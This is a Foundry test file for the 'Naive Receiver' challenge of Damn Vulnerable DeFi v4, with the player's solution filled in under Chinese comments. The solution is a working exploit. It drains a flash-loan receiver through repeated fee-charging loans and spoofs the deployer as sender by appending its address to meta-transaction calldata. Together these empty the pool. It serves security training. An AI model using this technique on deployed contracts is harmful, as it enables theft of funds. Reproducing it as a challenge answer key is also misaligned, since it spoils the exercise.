// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;
    uint256 constant FLASH_LOAN_COUNT = 10;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // 准备 multicall 数据：10次闪电贷 + 1次提款
        bytes[] memory calls = new bytes[](FLASH_LOAN_COUNT + 1);
        
        // 1. 前10次：纯闪电贷调用（不附加额外数据）
        for (uint i = 0; i < FLASH_LOAN_COUNT; i++) {
            calls[i] = abi.encodeWithSignature(
                "flashLoan(address,address,uint256,bytes)",
               address(receiver),    // 接收者
                address(weth), // 贷款资产
                WETH_IN_POOL,          // 贷款金额
                 bytes("")               // ⚠️ 空数据（不附加额外信息）
            );
        }
        
        // 2. 最后一次：提款调用（附加任意sender）
        calls[FLASH_LOAN_COUNT] =  abi.encodePacked(abi.encodeWithSignature(
            "withdraw(uint256,address)",
            WETH_IN_POOL+WETH_IN_RECEIVER,
            recovery  // ⚠️ 仅这次附加sender
        ),bytes20(deployer));
         
        
         // 调试：打印 nonce / 余额，便于排查
        console.log("forwarder.nonces(player) before:", forwarder.nonces(player));
        console.log("vm.getNonce(player) before:", vm.getNonce(player));
        console.log("receiver WETH before:", weth.balanceOf(address(receiver)));
        console.log("pool WETH before:", weth.balanceOf(address(pool)));
        console.log("recovery WETH before:", weth.balanceOf(recovery));


        // 3. 执行攻击
       BasicForwarder.Request memory request = BasicForwarder.Request({
            from:   player,
            target: address(pool),
            value: 0,
            gas: 1_500_000,
            nonce: forwarder.nonces(player),
             data: abi.encodeWithSignature("multicall(bytes[])", calls), // <-- 关键：包含 selector
            deadline: block.timestamp + 3600
        });
        
        // 签名
        bytes memory signature = signRequest(forwarder, request, playerPk);
       
        // 调试：再次打印签名使用的 nonce（保证签名中的 nonce 与 forwarder.nonces(player) 一致）
        console.log("using nonce for signature:", request.nonce);

        forwarder.execute{value: 0}(request, signature);

         // 调试：打印执行后状态
        console.log("forwarder.nonces(player) after:", forwarder.nonces(player));
        console.log("vm.getNonce(player) after:", vm.getNonce(player));
        console.log("receiver WETH after:", weth.balanceOf(address(receiver)));
        console.log("pool WETH after:", weth.balanceOf(address(pool)));
        console.log("recovery WETH after:", weth.balanceOf(recovery));
       
    }



    function signRequest(
        BasicForwarder forwarder,
        BasicForwarder.Request memory request,
        uint256 privateKey
    ) internal view returns (bytes memory) {
        bytes32 dataHash = forwarder.getDataHash(request);
        bytes32 domainSeparator = forwarder.domainSeparator();
        
        bytes32 typedDataHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                domainSeparator,
                dataHash
            )
        );
        
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, typedDataHash);
        return abi.encodePacked(r, s, v);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
    // 打印所有相关数值

    
    // Player must have executed two or less transactions
    uint256 playerNonce = vm.getNonce(player);
    console.log(unicode"玩家交易次数 (nonce):", playerNonce);
           assertLe(vm.getNonce(player), 2);


    // The flashloan receiver contract has been emptied
    uint256 receiverBalance = weth.balanceOf(address(receiver));
    console.log(unicode"接收者合约 WETH 余额:", receiverBalance);
    assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

    // Pool is empty too
    uint256 poolBalance = weth.balanceOf(address(pool));
    console.log(unicode"资金池 WETH 余额:", poolBalance);
    
        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

    // All funds sent to recovery account
    uint256 expectedRecoveryBalance = WETH_IN_POOL + WETH_IN_RECEIVER;
    uint256 actualRecoveryBalance = weth.balanceOf(recovery);
    console.log(unicode"恢复账户预期 WETH 余额:", expectedRecoveryBalance);
    console.log(unicode"恢复账户实际 WETH 余额:", actualRecoveryBalance);
   // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    console.log(unicode"检查完成");
}
}
